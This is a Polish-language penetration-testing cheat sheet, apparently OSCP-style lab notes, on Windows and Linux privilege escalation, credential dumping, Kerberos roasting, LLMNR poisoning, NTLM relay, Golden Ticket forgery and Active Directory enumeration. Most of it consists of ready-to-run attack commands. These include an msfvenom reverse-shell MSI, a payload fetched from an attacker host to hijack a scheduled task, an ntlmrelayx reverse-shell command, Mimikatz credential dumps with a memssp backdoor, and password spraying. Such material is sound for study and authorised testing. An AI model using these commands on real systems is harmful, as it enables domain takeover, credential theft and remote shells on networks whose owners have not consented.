> `head` na `.c` czyta instrukcje kompilacji autora. Dopasuj kernel **oraz** dystrybucję. Automat-backstop: `unix-privesc-check standard > out.txt` (Kali-native, przenieś na cel).

### Inne szybkie tropy
```bash
sudo -l                                                # zawsze najpierw
find / -perm -u=s -type f 2>/dev/null                  # SUID
getcap -r / 2>/dev/null                                # capabilities
# Grupy poboczne (id): docker/lxd → GTFOBins container-escape; DirtyPipe/PwnKit/CVE-2021-4034 wg kernela
```

## 4.2 Windows privesc

### Uprzywilejowane tokeny (whoami /priv)
> Jeśli masz któreś z tych → droga do SYSTEM:
| Privilege | Wykorzystanie |
|-----------|---------------|
| **SeImpersonatePrivilege** | Ataki „potato” (PrintSpoofer/GodPotato/JuicyPotato) — impersonacja SYSTEM |
| **SeAssignPrimaryTokenPrivilege** | j.w., w parze z SeImpersonate |
| **SeBackupPrivilege** | Czytanie dowolnego pliku → dump SAM/SYSTEM hive |
| **SeRestorePrivilege** | Zapis dowolnego pliku/klucza rejestru |
| **SeDebugPrivilege** | Podpięcie debuggera → dump LSASS, injection |
```
whoami /all
systeminfo
set
```
**Potato (SeImpersonate) — najczęstszy przypadek z konta serwisowego:**
```cmd
PrintSpoofer64.exe -i -c cmd                            :: Win10/Server 2016-2019
GodPotato -cmd "cmd /c whoami"                          :: nowsze systemy
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
.\SigmaPotato "net localgroup Administrators dave4 /add"   :: nowszy fork (in-memory, .NET)
```

### Service hijacking (słabe uprawnienia usług)
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
# Sprawdź uprawnienia binarki usługi (czy możesz nadpisać):  icacls "C:\Path\service.exe"
# Automat (PowerUp): znajdź i nadpisz podatną usługę jednym ruchem:
#   Import-Module .\PowerUp.ps1 ; Invoke-AllChecks
#   Install-ServiceBinary -Name 'vulnsvc'      # podmienia binarkę → dodaje admina
```

### Unquoted Service Paths
> Ścieżka usługi bez cudzysłowów + spacja → Windows próbuje uruchomić `C:\Program.exe` itd.
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### DLL Hijacking
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, InstallLocation
```
> Użyj **Process Monitor** (filtr: Result = NAME NOT FOUND, Path kończy się na .dll) żeby znaleźć DLL ładowany z zapisywalnej ścieżki.

### Registry — auto-logon i sekrety
```cmd
:: Auto-logon credentials (sprawdź DefaultPassword + AutoAdminLogon=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: Zainstalowane apps
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
:: Szukanie 'password' w całym rejestrze
reg query HKLM /f "password" /t REG_SZ /s
```

### Scheduled Tasks — podmiana zapisywalnej akcji (privesc)
```cmd
schtasks /query /fo LIST /v                             :: szukaj: Task To Run, Run As User, Next Run Time
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe  :: masz (F) Full? → podmień binarkę akcji
```
```powershell
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak    # backup oryginału
iwr -Uri http://$LHOST/adduser.exe -Outfile BackendCacheCleanup.exe    # podłóż payload
move .\BackendCacheCleanup.exe .\Pictures\
net localgroup administrators                           # po odpaleniu tasku sprawdź efekt
```
> 3 pytania: (1) jaki user uruchamia task (elewacja tylko gdy uprzywilejowany), (2) czy trigger jeszcze strzeli, (3) co robi akcja. Poczekaj jeden interwał. Cleanup: przywróć `.bak`.
```cmd
:: Tworzenie zdalne (wymaga uprawnień):
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```
> **Payload `adduser` do hijacków** (service / DLL / scheduled task) — kompilacja na Kali (mingw):
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe        # rdzeń: system("net user dave2 Pass123! /add"); system("net localgroup administrators dave2 /add");
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll   # wariant DLL (te same 2× system() w DllMain / DLL_PROCESS_ATTACH)
```

### Kernel exploit / brakujący patch (ostateczność)
> Gdy wektory usług/tokenów/creds martwe, a patch-level niski.
```powershell
Get-CimInstance -Class win32_quickfixengineering | ? { $_.Description -eq "Security Update" }   # sparse lista = kandydat
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
```cmd
:: zmapuj OS build + zainstalowane KB w MSRC Update Guide → znajdź BRAKUJĄCY patch (np. CVE-2023-29360 → KB5027215)
.\CVE-2023-29360.exe & whoami                            :: → nt authority\system
```
> Uruchamiaj TYLKO ze zweryfikowanym źródłem, najlepiej najpierw na klonie — kernel exploit potrafi zawiesić maszynę. Disruptive = sprawdź rules of engagement.

### Zapisane poświadczenia (hidden in plain view)
```cmd
cmdkey /list                                            :: zapisane creds Windows
runas /savecred /user:admin "cmd /c whoami"             :: użyj zapisanych creds BEZ znajomości hasła
:: Pliki z hasłami (unattend/sysprep/GPP Groups.xml):
dir /s /b C:\*unattend.xml C:\*sysprep.xml C:\*Groups.xml 2>nul
findstr /si password *.xml *.ini *.txt *.config 2>nul
```
```powershell
type C:\Users\Public\Transcripts\*                        # transkrypty PowerShell (jackpot z hasłami)
(Get-PSReadlineOption).HistorySavePath ; Get-History       # historia PS bieżącej sesji
Get-ChildItem C:\ -Include *.kdbx,*.config,*.txt -File -Recurse -ErrorAction SilentlyContinue
```

### AlwaysInstallElevated (dowolny MSI jako SYSTEM)
```cmd
:: Jeśli OBA klucze zwrócą 0x1 → każdy MSI instaluje się jako SYSTEM:
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi
# na celu:  msiexec /quiet /qn /i evil.msi
```

---

# 5. Credential Access (Pozyskiwanie poświadczeń)

## 5.1 Łamanie hashy

### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt                                  # pokaż złamane
# Automatyczne rozpoznanie typu: john potrafi zgadnąć, ale przy AD zwykle podajesz format ręcznie
```
### Hashcat (szybszy, GPU)
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt    # -m = typ hasha
```
| `-m` | Typ |
|------|-----|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt (/etc/shadow) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 (Responder) |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | AS-REP Roast |
```bash
hashcat --example-hashes | grep -iA2 "ntlm"             # gdy nie znasz numeru -m
```
> Identyfikacja typu hasha przed łamaniem: `hashid '<hash>'` lub `nth --text '<hash>'`.

### Ekstrakcja hasha z pliku (`*2john`)
```bash
ssh2john id_rsa | sed 's/^[^:]*://' > ssh.hash    # ZDEJMIJ prefiks 'id_rsa:' — inaczej hashcat nie ładuje/łamie śmieci!
keepass2john Database.kdbx | sed 's/^[^:]*://' > kp.hash   # to samo: usuwa prefiks 'Database:'
zip2john plik.zip > zip.hash           # (analogicznie: office2john, gpg2john, pdf2john)
hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # KeePass
# Znajdź bazy KeePass na Windows (bywa kilka — personal + dział):
#   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
> ⚠️ **Cichy killer:** `*2john` dokleja `nazwapliku:` (jako „username") na początku — obejrzyj hash gołym okiem, wytnij wszystko do pierwszego `:`. **Klucz SSH:** `-m 22921` działa TYLKO dla `$6$`/SHA-512; nowoczesny **aes-256-ctr → "Token length exception"** → fallback do Johna:
```bash
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash && john --show ssh.hash    # John ogarnia aes-256-ctr; chmod 600 id_rsa przed użyciem klucza
```
> Dodatkowe tryby `-m`: **13400** KeePass · **22921** klucz SSH · **11600** 7-Zip · **13600** ZIP · **9600** Office 2013+ · **7500** Kerberos AS-REQ (etype 23).

**Reguły hashcat pod znaną politykę** (z `note.txt` znasz wzorzec → zbuduj regułę ręcznie — często jedyna droga):
```bash
echo '$1' > demo.rule                              # składnia: $X dopisz na końcu · ^X na początku · c Kapitalizuj · l/u lower/upper · r odwróć
hashcat -r demo.rule --stdout wordlist.txt         # DEBUG: pokaż kandydatów bez łamania (weryfikacja reguły)
hashcat -m 0 hash.txt rockyou.txt -r demo.rule --force
```
> Wiele funkcji w jednej linii = łączone: `$1 c $!` → `Password1!`. Każda linia = osobna mutacja. Ludzki nawyk: Kapitał na początku, cyfry, special na końcu (`! @ #`). Escape w shellu: `echo \$1`.

### Password spraying (1 hasło × wielu userów)
> **Najpierw sprawdź politykę lockout**, policz bezpieczną liczbę prób:
```cmd
net accounts                          :: Lockout threshold / observation window / min. długość hasła (na hoście domenowym)
```
Z Kali / Linuxa:
```bash
crackmapexec smb $DC -u users.txt -p 'Sezon2024!' -d $DOMAIN --continue-on-success   # nxc = następca cme; '(Pwn3d!)' = local admin!
kerbrute passwordspray -d $DOMAIN users.txt 'Sezon2024!'          # przez Kerberos (2 pakiety UDP/próbę, najciszej)
```
Z hosta domenowego (Windows):
```powershell
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin        # auto-enumeruje userów i sprayuje (-File = wordlista, -Admin = też admini)
# Low-and-slow przez ADSI (najmniej ruchu — 1 obiekt = 1 próba):
$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $PDC=($d.PdcRoleOwner).Name
$DN="DC=$($d.Name.Replace('.',',DC='))"; $S="LDAP://$PDC/$DN"
New-Object System.DirectoryServices.DirectoryEntry($S,"pete","Nexus123!")   # brak wyjątku = hasło poprawne
```
> ⚠️ **Lockout:** spray JEDNYM hasłem na rundę, z przerwami. `crackmapexec` NIE sprawdza polityki i jest głośny (pełne SMB/próba); `kerbrute` najcichszy. `Spray-Passwords.ps1` wymaga `powershell -ep bypass`. Mutacje list: `hashcat --stdout wordlist.txt -r best64.rule` albo `kwp`.

## 5.2 Mimikatz (Windows, wymaga admina/SYSTEM)

### Dump NTLM z lokalnego SAM
```
mimikatz
privilege::debug
token::elevate
lsadump::sam
```
### Dump NTLM z pamięci LSASS
```
privilege::debug
token::elevate
sekurlsa::msv
```
### Klucze Kerberos (do Pass-the-Key)
```
privilege::debug
sekurlsa::ekeys
```
### DCSync (wyciągnij hash dowolnego usera z DC — wymaga uprawnień replikacji)
```
lsadump::dcsync /domain:za.tryhackme.com /user:Administrator
```
### memssp (SSP backdoor — plaintext przy logowaniu; obejście Credential Guard)
```
privilege::debug
misc::memssp
```
```powershell
Get-ComputerInfo | Select DeviceGuardSecurityServicesRunning   # zawiera 'CredentialGuard' = LSASS chroniony
type C:\Windows\System32\mimilsa.log                            # plaintext creds po memssp + NASTĘPNYM logowaniu
```
> **Credential Guard** blokuje zrzut LSASS (`sekurlsa` pokazuje tylko „LSA Isolated Data") — ale chroni TYLKO konta **domenowe**; lokalne z SAM (`lsadump::sam`) zrzucasz normalnie. `memssp` wstrzykuje SSP (bez DLL na dysku) i łapie plaintext przy **kolejnym** logowaniu (poczekaj / wymuś RDP). OPSEC: `mimilsa.log` to plaintext na dysku — posprzątaj.

### secretsdump (Linux/impacket — alternatywa bez wchodzenia na hosta)
```bash
impacket-secretsdump $DOMAIN/user:password@$IP           # zdalny dump SAM+LSA+NTDS
impacket-secretsdump -just-dc $DOMAIN/user:password@$DC   # DCSync przez sieć (całe NTDS.dit)
```

## 5.3 Kerberos

### AS-REP Roasting (Linux — patrz też §1.8)
> Cel: konta z flagą `DONT_REQUIRE_PREAUTH` (UAC `0x410200`). Bez creds można samą listą userów; z creds `-request` bierze hash.
```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
impacket-GetNPUsers -dc-ip $DC -request -outputfile asrep.txt $DOMAIN/pete    # z poświadczeniami jednego usera
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### Kerberoasting (konta z SPN — wymaga dowolnych poprawnych creds)
```bash
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
> ⚠️ Błąd `KRB_AP_ERR_SKEW (Clock skew too great)` = rozjazd czasu z DC. Nie zmieniaj zegara Kali — użyj `faketime`: `sudo ntpdate $DC` (odczyt) → `faketime -f '+Xh' impacket-GetUserSPNs ...`. Konta maszynowe/gMSA/krbtgt mają losowe 120-znakowe hasła (niełamalne) → celuj w **konta userów** z SPN.

### Rubeus (Windows — na hoście domenowym)
```
Rubeus.exe asreproast /nowrap                    :: /nowrap = hash bez łamania linii (łatwiej skopiować)
Rubeus.exe kerberoast /outfile:hashes.kerberoast
Rubeus.exe kerberoast /tgtdeleg                   :: wymuś RC4 (etype 23) gdy konto ma AES — łatwiejsze łamanie
```
> Hashe kopiujesz na Kali i łamiesz (18200 / 13100). Rubeus/Ghostpack mają sygnatury AV.

### Targeted roasting (gdy masz GenericWrite/GenericAll nad userem — patrz §6.5)
> Nie znasz podatnych kont, ale kontrolujesz cudzy obiekt? Sam go „uczyń podatnym", zbierz hash, cofnij zmianę:
> - **Targeted Kerberoast:** dopisz SPN ofierze (`Set-DomainObject ... -Set @{serviceprincipalname='fake/svc'}`) → `Rubeus kerberoast` → usuń SPN.
> - **Targeted AS-REP:** ustaw ofierze flagę `DONT_REQ_PREAUTH` (przez UAC) → AS-REP roast → cofnij flagę. **Nie resetuj hasła** (zablokuje usera) — modyfikuj UAC.

## 5.4 Responder — LLMNR / NBT-NS / mDNS poisoning

> **Idea:** gdy Windows nie rozwiąże nazwy przez DNS, rozgłasza zapytanie **LLMNR/NBT-NS** do całej podsieci ("gdzie jest \\fileserver?"). Responder odpowiada „to ja!", ofiara próbuje się uwierzytelnić i **wysyła Ci NetNTLMv2 hash**. Klasyk na wejściu do sieci wewnętrznej, gdy nie masz jeszcze żadnych poświadczeń.

```bash
# Nasłuchuj i truj na interfejsie tunelowym/lan (uruchom NA POCZĄTKU, działa w tle):
sudo responder -I eth0 -dwv
# -I interfejs | -d odpowiadaj na NBT-NS domenowe | -w serwer WPAD | -v verbose
```
Złapane hashe lądują w logu + na ekranie (format hashcat):
```bash
ls -la /usr/share/responder/logs/
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt   # 5600 = NetNTLMv2
```
> 💡 **NetNTLMv2 hash da się łamać, ale NIE da się nim robić pass-the-hash.** Jeśli hasło jest mocne i nie łamie się → przekaż go dalej relayem (§5.5).

**Wymuszenie uwierzytelnienia** (nie czekaj, aż ktoś sam się pomyli — sprowokuj):
```bash
# Jeśli masz już niski shell/dostęp do share: wskaż ofierze plik na Twoim hoscie
# (ikona/plik na share, e-mail, itp.) - dowolne odwołanie do \\ATTACKER\x wyśle hash.
# Narzędzia: ntlm_theft (generuje .lnk/.scf/.url), lub wstrzyknięcie ścieżki UNC do formularza.
```
> ⚠️ **Egzamin/produkcja:** przed relayem **WYŁĄCZ** wbudowane serwery SMB i HTTP Respondera w `/etc/responder/Responder.conf` (`SMB = Off`, `HTTP = Off`), bo inaczej zajmą porty, których potrzebuje `ntlmrelayx`.

## 5.5 NTLM Relay (ntlmrelayx) — przekazanie zamiast łamania

> **Idea:** zamiast łamać złapany hash, **przekaż uwierzytelnienie w locie** do innej maszyny i wykonaj tam akcję z uprawnieniami ofiary. Warunek: **SMB signing = disabled/not required** na celu (sprawdź niżej). To najczęstsza droga z „mam hash, ale się nie łamie" do shella/creds.

**Krok 0 — znajdź cele bez SMB signing:**
```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt   # zapisze hosty z signing:False
# lub: nmap --script smb2-security-mode -p445 10.10.10.0/24
```
**Krok 1 — Responder truje, ale bez własnego SMB/HTTP** (patrz warning wyżej).

**Krok 2 — ntlmrelayx łapie i przekazuje:**
```bash
# Dump SAM/hashy na celu (gdy relayowany user jest tam lokalnym adminem):
impacket-ntlmrelayx -tf targets.txt -smb2support

# Interaktywny SMB client po udanym relayu (-i → łączysz się przez nc 127.0.0.1 <port>):
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Odpal komendę / reverse shell na celu:
impacket-ntlmrelayx -t smb://VICTIM_IP -smb2support -c 'powershell -enc <BASE64_REVSHELL>'

# Relay do LDAP na DC → np. dodanie komputera / RBCD / dump domeny:
impacket-ntlmrelayx -t ldap://$DC --escalate-user twoj_user
```
> 🎯 **Killer combo (OSCP AD):** wymuś auth konta maszynowego/admina (Responder / PetitPotam / PrinterBug) → relay do **LDAPS na DC** → skonfiguruj **RBCD** albo **Shadow Credentials** → uzyskaj TGT jako DA. Alternatywnie relay SMB → `--dump-laps` / secretsdump.

**Powiązane techniki wymuszania auth (coercion):**
```bash
python3 PetitPotam.py -u user -p pass $LHOST $DC      # MS-EFSRPC coercion
python3 printerbug.py $DOMAIN/user:pass@$DC $LHOST     # MS-RPRN (spooler) coercion
coercer coerce -u user -p pass -t $DC -l $LHOST        # zbiorczy coercer
```

> **Mapa decyzji (mam NetNTLMv2 hash — co dalej?):**
> 1. Spróbuj złamać: `hashcat -m 5600` → jak pęknie, masz plaintext (używaj wszędzie).
> 2. Nie pęka? → **relay** (§5.5), o ile cel ma SMB signing off.
> 3. Signing wszędzie on i hash mocny? → wróć do innych wektorów (Kerberoast, misconfig, web).

## 5.6 Domain dominance — Golden / Silver Ticket + NTDS.dit

> Po zdobyciu DA / hasha **krbtgt** możesz fałszować bilety Kerberos = trwała dominacja nad domeną. Tylko w autoryzowanym zakresie.

### Dump NTDS.dit (baza haseł całej domeny)
```bash
# Zdalnie przez DCSync (uprawnienia replikacji — DA/Administrators):
impacket-secretsdump -just-dc $DOMAIN/jeffadmin:'Haslo123!'@$DC             # całe NTDS.dit
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/jeffadmin:'Haslo123!'@$DC  # tylko krbtgt (pod golden)
```
```cmd
:: Offline na DC (jako DA) — ntds.dit jest zablokowany, więc zrób Volume Shadow Copy:
vshadow.exe -nw -p C:                                :: utwórz shadow (-nw bez writerów=szybciej); ZANOTUJ 'Shadow copy device name'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak               :: SYSTEM hive potrzebny do odszyfrowania NTDS
```
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL           # parsuj offline (przenieś oba .bak na Kali)
```
> Z NTDS masz NTLM wszystkich kont (w tym `krbtgt:502:...:HASH`) + klucze Kerberos (AES). Hash krbtgt = klucz do Golden Ticket. `vshadow.exe` to podpisana binarka z Windows SDK. **DCSync (§5.2) jest cichszy** — nie dotyka dysku ani nie zostawia śladu narzędzi.

### Golden Ticket (fałszywy TGT — dowolny user, cała domena)
> Potrzebne: NTLM **krbtgt** + **SID** domeny. Ważny nawet po zmianie hasła ofiary (krbtgt rzadko rotowany). Forsowanie+wstrzyknięcie biletu **nie wymaga admina** i działa z maszyny spoza domeny.
```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch          :: na DC — wyciągnij hash krbtgt (RID 502) i SID domeny
mimikatz # kerberos::purge             :: wyczyść istniejące bilety PRZED wstrzyknięciem
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
mimikatz # misc::cmd                    :: otwórz nowy cmd z wstrzykniętym biletem
```
```cmd
PsExec.exe \\dc1 cmd.exe                :: po NAZWIE hosta (nie IP!) → Kerberos; potem: whoami /groups → Domain/Enterprise/Schema Admins
```
> `/ptt` = wstrzyknij bilet od razu. ⚠️ Od lipca 2022 (KB5008380 / CVE-2021-42287) **musisz podać ISTNIEJĄCE konto** (`/user:jen`) — dawniej działała dowolna nazwa. Domyślnie bilet dostaje grupy 512/513/518/519/520.

### Silver Ticket (fałszywy TGS — jedna usługa, ciszej)
> Potrzebne: hash konta **usługi** (np. konta komputera / SPN) + SID. Dostęp tylko do wskazanej usługi (`/service`), ale **bez ruchu do DC** → trudniejsze do wykrycia niż golden.
```
mimikatz # kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:<hash_konta_uslugi> /ptt
```

---

# 6. Active Directory

> 🔗 Setup BloodHound graph: https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
> 🔗 PowerSploit/PowerView: https://github.com/PowerShellMafia/PowerSploit

> 🎯 **Drogowskaz — co po kolei robić w AD (z hosta domenowego):**
> 1. **Poznaj siebie** — swój SID + WSZYSTKIE grupy (też zagnieżdżone). Prawa często wisi na grupie, nie na Tobie. `whoami /groups`, `Get-DomainGroup -MemberIdentity <ja>`.
> 2. **Zmapuj domenę** — userzy, grupy, komputery, SPN-y, polityka haseł (§6.2). Cel: lista kont + gdzie co stoi.
> 3. **Szukaj szybkich winów** — AS-REP (§1.8), Kerberoast (§5.3), hasła w `description`, `Find-LocalAdminAccess`, `Find-DomainShare -CheckShareAccess`.
> 4. **ACL abuse** (§6.5) — kto ma potężne prawo nad kim (`Find-InterestingDomainAcl`). Znajdź GenericAll/WriteDacl/ForceChangePassword → przejmij konto → **powtórz enumerację z nowego kontekstu**. To pętla, nie jeden strzał.
> 5. **Ruch boczny** — z sesji admina/hasha/biletu skacz dalej: PtH/Overpass/PtT (§7.2), WMI/WinRM/PsExec/DCOM (§7.1). Po każdym hoście → dumpuj LSASS (§5.2) i szukaj nowych creds.
> 6. **Eskaluj do domeny** — gdy dojdziesz do DA/DCSync → NTDS.dit, Golden/Silver Ticket (§5.6).
>
> ⚙️ **Setup:** wchodź na hosta przez **RDP** (`xfreerdp /u: /d: /v:`), nie WinRM/PSRemoting — inaczej trafisz na **Kerberos double-hop** i narzędzia enum przestaną sięgać do DC. Skrypty odpalaj po `powershell -ep bypass`. Po każdym nowym foothold **powtórz całą enumerację** — uprawnienia różnią się per konto.
>
> 💎 **Co jest wartościowe (na co polować):** konta z SPN (Kerberoast) · konta `DONT_REQ_PREAUTH` (AS-REP) · hasła w `description`/`info`/GPP · prawa ACL (GenericAll/WriteDacl/GenericWrite/ForceChangePassword) · local admin (`Find-LocalAdminAccess`) · sesje adminów (`Get-NetSession`) · share'y z zapisem/creds (`-CheckShareAccess`) · grupy z „Admin" w nazwie · zagnieżdżenia grup (członek grupy A, która jest w uprzywilejowanej B).

## 6.1 Zbieranie danych — SharpHound / BloodHound

**SharpHound.exe** — kolektor na hoście domenowym (Windows):
```
.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```
**SharpHound.ps1** (ingestor PowerShell) — gdy wolisz nie zrzucać .exe:
```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ -OutputPrefix "corp_audit"
```
**bloodhound-python** — kolektor z Linuxa (potrzeba poświadczeń):
```bash
bloodhound-python -u asrepuser1 -p 'qwerty123!' -d $DOMAIN -ns $DC -c All --zip
```
Uruchomienie GUI (import ZIP-a przez drag&drop):
```bash
sudo neo4j start                    # baza (login http://localhost:7474, domyślny user neo4j)
bloodhound                          # aplikacja GUI
# stop: sudo neo4j stop
```
**Co analizować w BloodHound** dla wybranego obiektu:
- *Object information* — nazwa, typ, domena
- *Sessions* — aktywne sesje logowania
- *Member of* — członkostwo w grupach
- *Local admin privileges* — gdzie jest lokalnym adminem
- *Execution privileges* — RDP/PSRemote
- *Outbound/Inbound object control* — prawa nad innymi obiektami i odwrotnie
- **Prebuilt queries** → "Shortest Path to Domain Admins" = złota ścieżka

## 6.2 Enumeracja z hosta domenowego (manual → PowerView → moduł AD)

> Trzy poziomy tego samego: **ręcznie przez LDAP/.NET** (nic nie instalujesz, nie zrzucasz podejrzanych narzędzi na dysk), **PowerView** (szybki recon ofensywny) i **moduł ActiveDirectory** (natywny, „czysty”). Na maszynie bez internetu i z AV — manual ratuje.

### A. Ręczna enumeracja przez LDAP (.NET / ADSI, bez narzędzi)
Namierz kontroler domeny (PDC) i bazowy DN:
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name           # nazwa DC (PDC emulator)
$DN  = ([adsi]'').distinguishedName            # np. DC=corp,DC=com
$LDAP = "LDAP://$PDC/$DN"
```
Surowe zapytanie DirectorySearcher (użytkownicy = `samAccountType=805306368`):
```powershell
$direntry    = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter = "samAccountType=805306368"
$result = $dirsearcher.FindAll()
Foreach($obj in $result){ Foreach($prop in $obj.Properties){ $prop } }   # wypisz atrybuty
```
Funkcja wielokrotnego użytku (wklej raz, potem odpytuj dowolnym filtrem LDAP):
```powershell
function LDAPSearch {
    param ([string]$LDAPQuery)
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}
```
Najczęstsze filtry LDAP:
```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"           # wszyscy użytkownicy
LDAPSearch -LDAPQuery "(objectclass=group)"                  # wszystkie grupy
LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"       # konkretna grupa
LDAPSearch -LDAPQuery "(objectCategory=computer)"            # komputery
LDAPSearch -LDAPQuery "(&(objectCategory=person)(servicePrincipalName=*))"   # konta z SPN → Kerberoast
# Członkowie grupy (w tym zagnieżdżeni) — atrybut 'member':
foreach ($g in $(LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))")){ $g.properties.member }
# Członkostwo usera — atrybut 'memberof':
foreach ($o in $(LDAPSearch -LDAPQuery "(name=jeffadmin)")){ $o.properties.memberof }
```
> Atrybuty warte czytania: `samaccountname`, `memberof`, `serviceprincipalname` (Kerberoast), `useraccountcontrol` (`DONT_REQ_PREAUTH` → AS-REP, `TRUSTED_FOR_DELEGATION` → delegacja), `pwdlastset`, `lastlogon`, `description` (często leżą tam hasła!), `operatingsystem`.

### B. SPN — ręcznie (pod Kerberoasting, §5.3)
```cmd
setspn -L iis_service            :: SPN-y konkretnego konta (setspn jest natywnie na Windows)
```
```powershell
LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
```

### C. PowerView (recon ofensywny)
```powershell
Import-Module .\PowerView.ps1
Get-NetDomain                                     # info o domenie (nazwa, DC-e)
Get-NetUser | select cn,pwdlastset,lastlogon       # userzy + wybrane atrybuty
Get-NetUser -SPN | select samaccountname,serviceprincipalname   # konta z SPN (Kerberoast)
Get-NetGroup | select cn                           # grupy
Get-NetGroup "Domain Admins" | select member       # członkowie grupy
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion   # hosty + OS
Find-LocalAdminAccess                              # gdzie jestem lokalnym adminem
Get-NetSession -ComputerName files04               # kto ma sesję na hoscie (namierz adminów)
Find-DomainShare -CheckShareAccess                 # share'y, do KTÓRYCH mam dostęp (bez flagi = wszystkie)
Get-ObjectAcl -Identity stephanie                  # ACL obiektu (kto ma nad nim prawa); nowsza nazwa: Get-DomainObjectAcl
Find-InterestingDomainAcl -ResolveGUIDs            # ciekawe prawa (GenericAll/WriteDacl...) w całej domenie
Convert-SidToName S-1-5-21-...-1104                # SID → nazwa (obowiązkowe do czytania ACL-i)
Invoke-Kerberoast                                  # od razu wyciąga hashe TGS-REP
```
> `Get-NetSession` + `Find-LocalAdminAccess` = mapowanie ścieżek lateral movement bez BloodHound. `Get-ObjectAcl` + `Find-InterestingDomainAcl` = szukanie ścieżek ACL-owych (masz np. WriteDacl nad kontem admina → przejmujesz je). **Pełny łańcuch ACL abuse → §6.5, domain shares/SYSVOL → §6.6.**

**Kto jest zalogowany (logged-on users → namierzanie adminów):**
```powershell
Get-NetSession -ComputerName files04 -Verbose      # na serwerach często "Access is denied" (od 2016 wymaga uprawnień)
Get-NetSession -ComputerName client74              # workstacje userów zwykle ODPOWIADAJĄ → tu szukaj sesji
.\PsLoggedon.exe \\files04                          # Sysinternals — alternatywa, gdy Get-NetSession blokuje
```
> Praktyka z modułu: `Get-NetSession` na kontrolerach/serwerach zwykle zwraca *Access denied*, ale na **stacjach roboczych** działa — tam łapiesz, gdzie loguje się admin (cel PtH/lateral). `PsLoggedon` to backup, gdy sesje są zablokowane.

